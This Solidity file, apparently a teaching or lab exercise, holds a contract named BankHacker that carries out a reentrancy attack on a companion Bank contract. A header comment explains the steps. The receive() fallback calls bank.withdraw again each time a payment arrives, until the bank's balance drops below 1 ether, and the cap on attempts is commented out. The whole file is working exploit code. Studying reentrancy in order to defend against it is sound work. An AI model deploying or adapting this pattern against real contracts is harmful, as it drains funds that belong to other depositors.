// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

/* 
    @dev attempt to hack the Bank.sol contract
    1. Make a bank deposit of 1 ether
    2. Make a legitimate withdrawal of 1 ether on the 
        bank, provided there is enough funds in the 
        contract's ether balance
    3. When the bank pays this contract, it will hit the 
        receive (fallback) routine, which will accept the payment
        and then re-call the withdraw routine provided there
        is at least 1 ether in the bank contract's account. This will
        help to ensure the transaction is not reverted.
 */
 import "./Bank.sol";

contract BankHacker {

    error InsufficientBalanceToPerformDeposit();

    Bank public bank;
    uint private hackAttemptNumber = 0;
    uint private maxHackAttempts = 2;
    uint256 private depositAmount       = 1000000000000000000; // 1 ether
    uint256 private withdrawalAmount    = 1000000000000000000; // 1 ether

    event HackerBalance(
        address contractAddress,
        uint    contractBalance,
        string  timingOfDeposit
    );


    event SendDeposit(
        address depositToAddress,
        uint    depositValue,
        string  functionName
    );

    event RequestWithdrawal(
        address withdrawToAddress,
        uint    withdrawalValue,
        string  functionName
    );

    event HackerReceivedFunds(
        address hackerAddress,
        uint    hackedValue,
        uint    hackAttemptNumber,
        string  functionName
    );
    constructor (address payable _bankAddress) {
        // Get reference to the Bank contract
        bank = Bank(_bankAddress);

    }
    function initializeBalance() external payable {
        // Balance sent in msg.value will be added to contract balance automatically
    }
    function getContractBalance() external view returns(uint) {
        return address(this).balance;
    }
    function getDepositBalance() external view returns(uint) {
        return bank.getDepositBalance(address(this));
    }
    function makeDeposit() external payable {

        // Signed tx sends in 1 ether, which is immediately += contract balance

        if( msg.value > address(this).balance ) {
            revert InsufficientBalanceToPerformDeposit();
        }
        uint contractBalance = address(this).balance;

        emit HackerBalance(
            address(this),
            contractBalance,
            "beforeDeposit"
        );
        
        emit SendDeposit(
            address(this),
            msg.value, 
            "makeDeposit"
        );

        // deposit funds
        bank.deposit{value: msg.value}( address(this) );
        
        contractBalance = address(this).balance;
        emit HackerBalance(
            address(this),
            contractBalance,
            "afterDeposit"
        );

        // withdraw funds
        this.withdraw();


    }

    function withdraw () external {
  
        // reset hack attempts
        hackAttemptNumber = 0;

        emit RequestWithdrawal(
            address(this), 
            withdrawalAmount,
            "withdraw"
        );

        // normal withdrawal, not a "hack"
        bank.withdraw(payable(address(this)), withdrawalAmount);

    }

    receive () external payable {
        
        emit HackerReceivedFunds(
            address(this), 
            msg.value, 
            hackAttemptNumber, 
            "receive"
        );

        // if( (address(bank).balance > 1 ether) && (hackAttemptNumber < maxHackAttempts) ) {
        if( (address(bank).balance >= withdrawalAmount) )  {


            hackAttemptNumber += 1;

            bank.withdraw(payable(address(this)), withdrawalAmount);
            
        }
    }

} 